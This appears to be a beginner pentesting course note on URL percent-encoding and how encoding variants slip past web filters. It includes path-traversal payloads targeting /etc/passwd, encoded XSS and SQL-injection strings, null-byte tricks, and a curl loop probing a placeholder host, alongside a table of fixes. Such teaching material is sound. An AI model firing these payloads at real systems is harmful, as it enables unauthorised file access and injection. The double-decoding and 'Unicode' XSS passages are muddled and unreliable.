---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.10 URL Encoding and Percent Encoding"
---

# 02.10 — URL Encoding and Percent Encoding

## What is it?

**URL encoding** (also called **percent encoding**) converts characters that aren't safe in URLs into a `%XX` format where `XX` is the hexadecimal ASCII code. This allows special characters to be transmitted in URLs without breaking the URL syntax.

**For pentesters, encoding is a weaponized tool** — different encodings bypass WAFs, confuse parsers, and enable attacks that straight payloads can't.

---

## How Percent Encoding Works

```
ENCODE:
  Character → ASCII decimal → Hex → %HH
  space     → 32           → 20  → %20
  /         → 47           → 2F  → %2F
  .         → 46           → 2E  → %2E
  @         → 64           → 40  → %40
  #         → 35           → 23  → %23
  ?         → 63           → 3F  → %3F
  &         → 38           → 26  → %26
  =         → 61           → 3D  → %3D
  +         → 43           → 2B  → %2B  (also: + = space in query string!)
  <         → 60           → 3C  → %3C
  >         → 62           → 3E  → %3E
  "         → 34           → 22  → %22
  '         → 39           → 27  → %27
  \         → 92           → 5C  → %5C

UNRESERVED (safe, no encoding needed):
  A-Z, a-z, 0-9, - _ . ~
```

---

## Common Encoding Reference Table

```
CHAR   URL ENCODED   DOUBLE ENCODED   UNICODE
─────────────────────────────────────────────────────
/      %2F            %252F            %c0%af (overlong)
.      %2E            %252E
space  %20 or +       %2520
<      %3C            %253C
>      %3E            %253E
"      %22            %2522
'      %27            %2527
`      %60            %2560
\      %5C            %255C
NULL   %00            %2500
CR     %0D            %250D
LF     %0A            %250A
#      %23            %2523
?      %3F            %253F
&      %26            %2526
=      %3D            %253D
@      %40            %2540
:      %3A            %253A
```

---

## Encoding Variants for WAF Bypass

```
ORIGINAL PAYLOAD:
  ../../../etc/passwd

ENCODED VARIANTS (all should reach same file if decoded properly):

1. Standard URL encoding:
   ..%2F..%2F..%2Fetc%2Fpasswd

2. Double URL encoding (if server decodes twice):
   ..%252F..%252F..%252Fetc%252Fpasswd
   (%25 = %, so %252F → first decode: %2F → second decode: /)

3. Unicode / UTF-8 overlong:
   ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
   (%c0%af = / in overlong UTF-8)

4. Mixed encoding:
   ..%2f..%2f..%2fetc/passwd

5. Uppercase encoding:
   ..%2F..%2F..%2Fetc%2Fpasswd
   (encoding is case-insensitive: %2f = %2F)

6. Null byte:
   ../../etc/passwd%00.jpg
   (if app checks extension, null byte may truncate at %00)
   ← PHP < 5.3.4 vulnerable

7. URL + HTML double encoding (for XSS via URL):
   %26lt%3Bscript%26gt%3B = &lt;script&gt; (HTML decoded)
```

---

## Security Context — Encoding in VAPT

### 1. WAF Bypass via Encoding

```
BLOCKED:
  ?q=<script>alert(1)</script>
  WAF sees: <script> → block!

BYPASS WITH ENCODING:
  ?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
  WAF sees: %3Cscript%3E → allows (doesn't decode before checking)
  Server decodes → sees: <script>alert(1)</script> → XSS!

MORE BYPASSES:
  Double encoded:
  ?q=%253Cscript%253E  → WAF sees %253C → allows
                       → Server decodes %25 → %3C → decodes again → <

  Unicode:
  ?q=<script> → browser decodes to <script>
```

### 2. Path Traversal Encoding

```bash
# Test each encoding variant:
TARGET="https://target.com/files/"
FILE="../../../../etc/passwd"

for payload in \
  "../../../etc/passwd" \
  "..%2F..%2F..%2Fetc%2Fpasswd" \
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
  "..%252f..%252f..%252fetc%252fpasswd" \
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" \
  "....//....//....//etc/passwd"; do
  
  code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${payload}")
  echo "$payload → $code"
done
```

### 3. SQL Injection with Encoding

```
BLOCKED:
  ' OR '1'='1
  WAF blocks single quotes

BYPASS:
  %27 OR %271%27=%271    → URL encoded
  %2527 OR %25271...     → double encoded

But usually SQLi encoding is done at SQL level:
  0x61646d696e             → hex for "admin" (MySQL)
  CHAR(97,100,109,105,110) → CHAR() function
  admin                    → (with SQLi that converts from hex)
```

### 4. +  vs %20 — Space Encoding

```
In QUERY STRING:
  + means space (legacy HTML form encoding)
  %20 also means space

But in PATH:
  + is a literal plus sign (NOT space)
  %20 is a space

ATTACK:
  Path: /files/my+file.pdf → looks for "my+file.pdf" (literal +)
  vs
  Path: /files/my%20file.pdf → looks for "my file.pdf"

WAF bypass: use + in path where WAF expects %20 for space-based payloads
```

### 5. Double Decoding Vulnerability

```
VULNERABLE PATTERN:
  App decodes URL → checks against allowlist → decodes AGAIN → uses

  Input: %252e%252e%252fetc%252fpasswd

  First decode:  %2e%2e%2fetc%2fpasswd   → (check: dots and slash, hmm looks suspicious but no /)
  Wait — first decode: %2e%2e%2f → still encoded after single decode
  
  Actually:
  Input: %252F = percent-encoded percent-encoded /
  First decode: %2F (still encoded /)
  App allowlist check: "no slash" - sees %2F → passes!
  Second decode: / → now it's a real slash → path traversal!
```

### 6. Null Byte Injection

```
%00 = null byte (character 0x00)

PHP < 5.3.4:
  /etc/passwd%00.jpg
  App checks extension → .jpg → allows!
  PHP file include strips at %00 → reads /etc/passwd!

C functions (strlen stops at null):
  username: admin%00' OR '1'='1
  strlen("admin") = 5 (stops at null) → length check passes
  Database receives full string → SQLi!
```

---

## Hands-On: Encoding Tools

```bash
# URL encode a string (Python)
python3 -c "import urllib.parse; print(urllib.parse.quote('../../../etc/passwd'))"
# → ..%2F..%2F..%2Fetc%2Fpasswd

# URL decode a string (Python)
python3 -c "import urllib.parse; print(urllib.parse.unquote('%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'))"
# → ../../etc/passwd

# Double encode
python3 -c "import urllib.parse; s='../../../etc/passwd'; print(urllib.parse.quote(urllib.parse.quote(s)))"

# Encode specific characters only
python3 -c "import urllib.parse; print(urllib.parse.quote('../etc/passwd', safe='/'))"

# CyberChef (web tool — great for chaining encodings)
# https://gchq.github.io/CyberChef/

# Burp Suite: Decoder tab
# Select text → Encode as URL, HTML, Base64, etc.
# Or: Ctrl+Shift+U to URL-encode selection in Repeater

# curl with encoded URL
curl "https://target.com/files/..%2F..%2F..%2Fetc%2Fpasswd"
curl --path-as-is "https://target.com/files/../../../etc/passwd"  # don't normalize path
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| WAF bypass via double encoding | Normalize/decode input BEFORE WAF inspection |
| Path traversal via encoded slashes | Normalize paths completely, then validate (no `../`) |
| Null byte injection | Don't use C-style string functions with user input |
| Multiple decoding layers | Decode once, validate, use — never decode again |
| Content-Type sniffing | Set X-Content-Type-Options: nosniff |

---

## Related Notes
- [[08 - URLs Anatomy]] — URL structure
- [[09 - Query Strings and Parameters]] — parameters and encoding
- [[Module 16 - Path Traversal]] — path traversal via encoding
- [[Module 02 - XSS]] — encoding in XSS payloads
- [[Module 36 - WAF Bypass]] — encoding as WAF evasion
